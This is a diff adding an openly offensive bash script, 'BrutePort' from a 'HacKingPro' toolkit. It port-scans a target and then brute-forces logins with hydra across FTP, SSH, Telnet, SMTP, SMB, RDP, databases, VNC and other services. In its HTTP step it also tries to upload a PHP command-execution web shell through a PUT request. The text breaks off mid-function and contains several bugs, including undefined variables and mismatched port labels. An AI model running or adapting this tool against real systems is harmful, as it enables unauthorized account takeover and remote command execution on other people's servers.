@@ -1,0 +1,662 @@
+#!/bin/sh
+#!/bin/bash
+#!/usr/bin/sh
+#!/usr/bin/bash
+#!/usr/bin/env sh
+#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/sh
+#!/data/data/com.termux/files/usr/bin/bash
+###############################################################
+#                                                             #
+# Created Date : 2022 May                                     #
+# Location: Made With LOVE IN ISRAEL !                        #
+# CREDIT: To All World Creators free Scripts & Tools          #
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
+# GREAT SCRIPTS                                               #
+#                                                             #
+###############################################################
+#                  ( Update: 02-08-2022 )                     #
+#-Metadata----------------------------------------------------#
+#                                                             #
+#  Filename: HacKingPro ~> BrutePort                          #
+#  Source: https://github.com/Anlominus/HacKingPro            #
+#                                                             #
+#-Info--------------------------------------------------------#
+#                                                             #
+#  Enter Your Target, Hack Him, and Get Markdown Report       #
+#                                                             #
+#                                                             #
+#-Author(s)---------------------------------------------------#
+#                                                             #
+#  AnLoMinus ~ https://github.com/AnLoMinus/                  #
+#  Skils: Best Copywriter IN the COSMOS!                      #
+#  Source: https://github.com/AnLoMinus/HacKingPro            #
+#                                                             #
+#-Operating System--------------------------------------------#
+#                                                             #
+#  Designed for: Kali / Parrot / Pentoo                       #
+#  Tested on: MacOS                                           #
+#                                                             #
+#-Notes-------------------------------------------------------#
+#                                                             #
+# - Run as root                                               #
+#                                                             #
+#                             ---                             #
+#                                                             #
+#     !!!!! This is a Part Of HacKingPro Tool !!!!!           #
+#                                                             #
+###############################################################
+
+###############################################
+#         HacKingPro Design Variables
+###############################################
+
+HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro$resetT")
+Anlominus=$(echo "${BGreen}An${DGrey}Lo${BRed}Minus")
+MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}20")
+HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
+HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
+Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
+Press_Enter_To_START=$(echo "\n\n${BYellow}                🔶    Press Enter To START    🔶     ${BGreen}\n\n")
+InvalidOption=$(echo "\n\t\t ${BGreen}»»» ${HacKingPro} ${LRed}Invalid Option ${BRed}¯\_(ツ)_/¯ \n")
+
+BGreen='\033[1;32m'  # Green
+BRed='\033[1;31m'    # Red
+
+targetIP="1.1.1.1"
+targetNAME="oneX"
+###############################################################
+#------------------[ Brute Force start ]----------------------#
+###############################################################
+
+BrutePort(){
+
+  # Creating Scans and Output Folders
+  Report() {
+    echo " "
+    echo "    ${BGreen}┌─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    mkdir AttacKing
+    cd AttacKing
+    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Scans ${BRed}]"
+  	mkdir Scans Scans/${targetNAME} &> /dev/null
+    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Output ${BRed}]"
+    mkdir Output Output/${targetNAME} &> /dev/null
+    echo "    ${BGreen}└─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    read -p "$Press_ENTER"
+  }
+  Report
+
+  # Represent that Bruteforce finished
+  Finished_Brute() {
+    echo "[${green}*${default}] Bruteforce finished. Credentials found saved at: Output/${targetNAME}/."
+    sleep 1
+  }
+  ftp_up="/Wordlist/ftp_up.txt"
+  ftp_u="/Wordlist/ftp_u.txt"
+  ftp_p="/Wordlist/ftp_p.txt"
+  ssh_up="/Wordlist/ssh_up.txt"
+  ssh_u="/Wordlist/ssh_u.txt"
+  ssh_p="/Wordlist/ssh_p.txt"
+  smtp_u="/Wordlist/smtp_u.txt"
+  smtp_p="/Wordlist/smtp_p.txt"
+  pop_u="/Wordlist/pop_u.txt"
+  pop_p="/Wordlist/pop_p.txt"
+  telnet_up="/Wordlist/telnet_up.txt"
+  telnet_u="/Wordlist/telnet_u.txt"
+  telnet_p="/Wordlist/telnet_p.txt"
+  sql_u="/Wordlist/sql_u.txt"
+  sql_p="/Wordlist/sql_p.txt"
+  mssql_up="/Wordlist/mssql_up.txt"
+  mysql_up="/Wordlist/mysql_up.txt"
+  oracle_up="/Wordlist/oracle_up.txt"
+  postgres_up="/Wordlist/postgres_up.txt"
+  windows_u="/Wordlist/windows_u.txt"
+  windows_up="/Wordlist/windows_up.txt"
+  user="/Wordlist/user.txt"
+  pass="/Wordlist/pass.txt"
+  snmp_p="/Wordlist/snmp.txt"
+  vnc_p="/Wordlist/vnc_p.txt"
+  thread="16"
+
+  Port_Scan() {
+    echo " "
+  	echo "       ${BBlue}┌──[ 🎯 ]──[${BRed} Target ${BBlue}]──╼ ${BGreen} ${targetIP} ${BBlue}|  Number of threads: ${BGreen} ${thread}."
+  	echo "       ${BBlue}└──[ 🎯 ]──[${BRed} Agressive ${BBlue}]──╼ ${DGrey} Starting agressive scan of supported ports against: ${BGreen} ${targetIP}...\n"
+  	sleep 1
+  	sudo nmap -T4 -Pn -v --open ${targetIP} -p 21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,6667,8000,8080 >> "nmap.log"
+  	echo "[${yellow}*${default}] Scan finished."
+  	read -p "$Press_ENTER"
+  	pwd
+  	ls
+    read -p "$Press_ENTER"
+  	sleep 1
+  }
+  Port_Scan
+
+  echo " "
+
+  # Port 21 - (FTP)
+  BruteFTP(){
+    # - Name:
+    # - Version:
+    # - Anonymous login:
+    if grep -q 21/tcp nmap.log; then
+      echo "        ${BBlue}┌──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 21(FTP) is open. Starting bruteforce...\n"
+      BruteFTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
+      AfterBruteFTP="${BruteFTP_Open}"
+      # echo "${AfterBruteFTP}"
+      sleep 1
+      nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${targetIP}
+      hydra -C $ftp_up ${targetIP} ftp -e ns -o Output/${targetIP}/ftp_${targetIP}.txt -I -V -t $thread
+      hydra -L $ftp_u -P $ftp_p ${targetIP} ftp -e ns -o Output/${targetIP}/ftp1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}┌──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 21(FTP) is not open. Skipping to next port..."
+      BruteFTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
+      AfterBruteFTP="${BruteFTP_Close}"
+      # echo "${AfterBruteFTP}"
+    fi
+  }
+  BruteFTP
+
+  #  Port 22 - (SSH)
+  BruteSSH(){
+    # - Name:
+    # - Version:
+    # - Protocol:
+    # - RSA-key-fingerprint:
+    # - Takes-password:
+    # If you have usernames test login with username:username
+    if grep -q 22/tcp nmap.log; then
+      BruteSSH_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 22(SSH) is open. Starting bruteforce...\n")"
+      AfterBruteSSH="${BruteSSH_Open}"
+      echo "${AfterBruteSSH}"
+		  sleep 1
+		  hydra -C $ssh_up ${targetIP} ssh -e ns -o Output/${targetIP}/ssh_${targetIP}.txt -I -V -t $thread
+      hydra -L $ssh_u -P $ssh_p ${targetIP} ssh -e ns -o Output/${targetIP}/ssh1_${targetIP}.txt -I -V -t $thread
+		  hydra -L $user -p $pass ssh -e ns -o Output/${targetIP}/ssh2_${targetIP}.txt -I -V -t $thread
+      hydra -t 16 -L $user -P /usr/share/wordlists/rockyou.txt -vV $targetIP ssh
+      Finished_Brute "${targetIP}"
+    else
+      BruteSSH_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 22(SSH) is not open. Skipping to next port...")"
+      AfterBruteSSH="${BruteSSH_Close}"
+      echo "${AfterBruteSSH}"
+    fi
+  }
+  BruteSSH
+
+  #  Port 23 - (Telnet)
+  BruteTelnet(){
+    if grep -q 23/tcp nmap.log; then
+      BruteTelnet_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 23(Telnet) is open. Starting bruteforce...\n")"
+      AfterBruteTelnet="${BruteTelnet_Close}"
+      echo "${AfterBruteTelnet}"
+      sleep 1
+      hydra -C $telnet_up ${targetIP} telnet -e ns -o Output/${targetIP}/telnet_${targetIP}.txt -I -V -t $thread
+      hydra -L "$telnet_u" -P "$telnet_p" "${targetIP}" telnet -e ns -o Output/"${targetIP}"/telnet1_"${targetIP}".txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} telnet -e ns -o Output/${targetIP}/telnet2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteTelnet_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 23(Telnet) is not open. Skipping to next port...")"
+      AfterBruteTelnet="${BruteTelnet_Close}"
+      echo "${AfterBruteTelnet}"
+    fi
+  }
+  BruteTelnet
+
+  #  Port 25 - (SMTP)
+  BruteSMTP(){
+    # - Name:
+    # - Version:
+    # - VRFY:
+    # - EXPN:
+    if grep -q 25/tcp nmap.log; then
+      BruteSMTP_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 25(SMTP) is open. Starting bruteforce...\n")"
+      AfterBruteSMTP="${BruteSMTP_Open}"
+      nc -nvv ${targetIP} 25
+      # echo "${AfterBruteSMTP}"
+      sleep 1
+      nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 ${targetIP}
+      hydra -L $user -P $pass ${targetIP} smtp-enum -e ns -o Output/${targetIP}/smtp-enum_${targetIP}.txt -I -V -t $thread
+	    hydra -L $smtp_u -P $smtp_p ${targetIP} smtp -e ns -o Output/${targetIP}/smtp_${targetIP}.txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} smtp -e ns -o Output/${targetIP}/smtp1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteSMTP_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 25(SMTP) is not open. Skipping to next port...")"
+      AfterBruteSMTP="${BruteSMTP_Close}"
+      echo "${AfterBruteSMTP}"
+    fi
+ }
+  BruteSMTP
+
+  #  Port 80 - (HTTP)
+  BruteHTTP(){
+    # - Server:
+    # - Scripting language:
+    # - Apache Modules:
+    # - Domain-name address:
+    # - Web application
+    # - Name:
+    # - Version:
+   if grep -q 80/tcp nmap.log; then
+     echo "        ${AfterBruteHTTP} ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 80(HTTP) is open. Starting bruteforce...\n"
+     BruteHTTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
+     AfterBruteHTTP="${BruteHTTP_Open}"
+     echo ""
+     # Nikto
+     nikto -h http://${targetIP}
+
+     # Nikto with squid proxy
+     nikto -h ${targetIP} -useproxy http://${targetIP}:4444
+
+     # Get header
+     curl -i ${targetIP}
+
+     # Get everything
+     curl -i -L ${targetIP}
+
+     # Check if it is possible to upload using put
+     curl -v -X OPTIONS http://${targetIP}/
+     curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://${targetIP}/test/shell.php
+
+     # Check for title and all links
+     dotdotpwn.pl -m http -h ${targetIP} -M GET -o unix
+
+	   sleep 1
+	   hydra -L $user -P $pass ${targetIP} service http-get -o Output/${targetIP}/http-get_${targetIP}.txt -I -V / -t $thread
+     Finished_Brute "${targetIP}"
+   else
+
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 80(HTTP) is not open. Skipping to next port..."
+     BruteHTTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
+     AfterBruteHTTP="${BruteHTTP_Close}"
+     # echo "${AfterBruteHTTP}"
+   fi
+ }
+  BruteHTTP
+
+  #  Port 110 - (POP3)
+  BrutePOP3(){
+    # - Name:
+    # - Version:
+    if grep -q 110/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 110(POP3) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $pop_u -P $pop_p ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_${targetIP}.txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 110(POP3) is not open. Skipping to next port..."
+    fi
+  }
+  BrutePOP3
+
+  #  Port 139 - (SMB)
+  BruteSMB(){
+    # - Name:
+    # - Version:
+    # - Domain/workgroup name:
+    # - Domain-sid:
+    # - Allows unauthenticated login:
+    if grep -q 139/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 139(SMB) is open. Starting bruteforce...\n"
+      sleep 1
+      enum4linux -a ${targetIP}
+      smbclient -L ${targetIP}
+      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
+      hydra -L $windows_u -P $pass ${targetIP} smb -S 139 -e ns -o Output/${targetIP}/smb_139_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 139(SMB) is not open. Skipping to next port..."
+    fi
+
+  }
+  BruteSMB
+
+  #  Port 162 - (SNMP)
+  BruteSNMP(){
+    if grep -q 162/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 162(SNMP) is open. Starting bruteforce..."
+      sleep 1
+      nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes ${targetIP}
+      snmp-check -t ${targetIP} -c public  # Common community strings:    [  public   /   private   /   community  ]
+
+      hydra -P $snmp snmp -S 162 -e ns -o Output/${targetIP}/snmp_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 162(SNMP) is not open. Skipping to next port..."
+    fi
+  }
+  BruteSNMP
+
+  #  Port 389 - (LDAP)
+  BruteLDAP(){
+    if grep -q 389/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 389(LDAP) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $windows_u -P $pass ${targetIP} service ldap2 -S 389 -e ns -o Output/${targetIP}/ldap2_${targetIP}.txt -I -V -t $thread
+      hydra -L $windows_u -P $pass ${targetIP} service ldap3 -S 389 -e ns -o Output/${targetIP}/ldap3_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 389(LDAP) is not open. Skipping to next port..."
+    fi
+
+  }
+  BruteLDAP
+
+  #  Port 443 - (HTTPS)
+  BruteHTTPS(){
+    if grep -q 443/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 443(HTTPS) is open. Starting bruteforce...\n"
+      sleep 1
+      sslscan ${targetIP}:443
+      hydra -l $user -P $pass ${targetIP} service https-get -s 443 -o Output/${targetIP}/https-get_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 443(HTTPS) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTPS
+
+  #  Port 445 - (SMB)
+  BruteSMB445(){
+    if grep -q 445/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 445(SMB) is open. Starting bruteforce...\n"
+      sleep 1
+      enum4linux -a ${targetIP}
+      smbclient -L ${targetIP}
+      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
+      hydra -C $windows_up ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_${targetIP}.txt -I -V -t $thread
+      hydra -L $windows_u -P $pass ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 445(SMB) is not open. Skipping to next port..."
+   fi
+  }
+  BruteSMB445
+
+  #  Port 512 - (Rexec)
+  BruteREXEC(){
+    if grep -q 512/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 512(rexec) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rexec -S 512 -e ns -o Output/${targetIP}/rexec_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 512(rexec) is not open. Skipping to next port..."
+    fi
+  }
+  BruteREXEC
+
+  #  Port 513 - (Rlogin)
+  BruteRLOGIN(){
+    if grep -q 513/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 513(rlogin) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rlogin -S 513 -e ns -o Output/${targetIP}/rlogin_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 513C(rlogin) is not open. Skipping to next port..."
+   fi
+  }
+  BruteRLOGIN
+
+  #  Port 514 - (RSH)
+  BruteRSH(){
+    if grep -q 514/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 514(rsh) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rsh -S 514 -e ns -o Output/${targetIP}/rsh_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(rsh) is not open. Skipping to next port..."
+    fi
+  }
+  BruteRSH
+
+  #  Port 993 - (IMAP)
+  BruteIMAP(){
+    if grep -q 993/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 993(IMAP) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} imap -S 993 -e ns -o Output/${targetIP}/imap_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 993(IMAP) is not open. Skipping to next port..."
+    fi
+  }
+  BruteIMAP
+
+  #  Port 1433 - (MSSQL)
+  BruteMSSQL(){
+     # - Version:
+
+     # use auxiliary/scanner/mssql/mssql_ping
+     # Last options. Brute force.
+     # scanner/mssql/mssql_login
+
+     # If you have credentials look in metasploit for other modules
+
+     # Log in to mssql
+     # sqsh -S INSERTIPADDRESS -U sa
+
+     # Execute commands
+     # xp_cmdshell 'date'
+     # go
+     if grep -q 1433/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1433(mssql) is open. Starting bruteforce.../n"
+       sleep 1
+
+       hydra -C $mssql_up ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_${targetIP}.txt -I -V -t $thread
+       hydra -L $windows_u -P $pass ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+       echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1433(mssql) is not open. Skipping to next port..."
+     fi
+
+   }
+  BruteMSSQL
+
+  # Port 1521 - (Oracle)
+  BruteOracle(){
+    # - Name:
+    # - Version:
+    # - Password protected:
+    if grep -q 1521/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1521(oracle) is open. Starting bruteforce...\n"
+      sleep 1
+      tnscmd10g version -h ${targetIP}
+      tnscmd10g status -h ${targetIP}
+      hydra -C $oracle_up ${targetIP} oracle -S 1521 -e ns -o Output/${targetIP}/oracle_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1521(oracle) is not open. Skipping to next port..."
+   fi
+
+  }
+  BruteOracle
+
+  ### Port 2049 - NFS
+  # showmount -e INSERTIPADDRESS
+  ### If you find anything you can mount it like this:
+  # mount INSERTIPADDRESS:/ /tmp/NFS
+  # mount -t INSERTIPADDRESS:/ /tmp/NFS
+
+  #  Port 3306 (MySQL)
+  BruteMySQL(){
+     # - Name:
+     # - Version:
+     if grep -q 3306/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3306(mysql) is open. Starting bruteforce...\n"
+       sleep 1
+       mysql --host=${targetIP} -u root -p
+       nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 ${targetIP} -p 3306
+
+       hydra -C $mysql_up ${targetIP} mysql -e ns -o Output/${targetIP}/mysql_${targetIP}.txt -I -V -t $thread
+       hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${targetIP}/mysql_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3306(mysql) is not open. Skipping to next port..."
+  fi
+
+   }
+  BruteMySQL
+
+  ### Port 3339 - Oracle web interface
+  # - Basic info about web service (apache, nginx, IIS)
+  # - Server:
+  # - Scripting language:
+  # - Apache Modules:
+  # - IP-address:
+  # - Domain-name address:
+
+  #  Port 3389 (RDP) Remote Desktop
+  BruteRDP(){
+     # Test logging in to see what OS is running
+     # rdesktop -u guest -p guest ${targetIP} -g 94%
+
+     # Brute force
+     # ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://${targetIP}
+
+     if grep -q 3389/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3389(RDP) is open. Starting bruteforce...\n"
+       sleep 1
+       hydra -C $windows_u ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_${targetIP}.txt -I -V -t $thread
+       hydra -L $windows_u -P $pass ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3389(RDP) is not open. Skipping to next port..."
+  fi
+
+   }
+  BruteRDP
+
+  #  Port 5432 (PostGres)
+  BrutePostgres(){
+    if grep -q 5432/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5432(postgres) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -C $postgres_up ${targetIP} postgres -e ns -o Output/${targetIP}/postgres_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5432(postgres) is not open. Skipping to next port..."
+    fi
+  }
+  BrutePostgres
+
+  #  Port 5900 (VNC)
+  BruteVNC(){
+    if grep -q 5900/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5900(VNC) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -P $vnc_p ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_${targetIP}.txt -I -V -t $thread
+      hydra -P $pass ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5900(VNC) is not open. Skipping to next port..."
+    fi
+  }
+  BruteVNC
+
+  #  Port 5901 (VNC)
+  BruteVNC5901(){
+   if grep -q 5901/tcp nmap.log; then
+    echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5901(VNC) is open. Starting bruteforce...\n"
+		sleep 1
+		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
+		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
+		Finished_Brute "${targetIP}"
+   else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
+   fi
+}
+  BruteVNC5901
+
+  #  Port 6667 (IRC)
+  BruteIRC(){
+    if grep -q 6667/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
+    fi
+  }
+  BruteIRC
+
+  #  Port 8000 (HTTP HEAD)
+  BruteHTTP8000(){
+    if grep -q 8000/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTP8000
+
+  #  Port 8080 (HTTP HEAD)
+  BruteHTTP8080(){
+    if grep -q 8080/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -S 8080 -f -q -e ns -o Output/${targetIP}/http-head_8080_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8080(HTTP HEAD) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTP8080
+
+  #  Port 8100 (HTTP HEAD)
+  BruteHTTP8100(){
+    if grep -q 8100/tcp nmap.log; then
+      echo "        ${BBlue}└──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}└──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
+    fi
+  }
+  BruteHTTP8100
+
+  read -p "$Press_ENTER"
+
+  if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
+  	help
+  	exit
+  fi
+
+  if [ ! -z "$2" ]; then
+  	if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
+  		echo -e "[${red}!${default}] Maximum number of threads is 64!"
+  		exit
+  	else
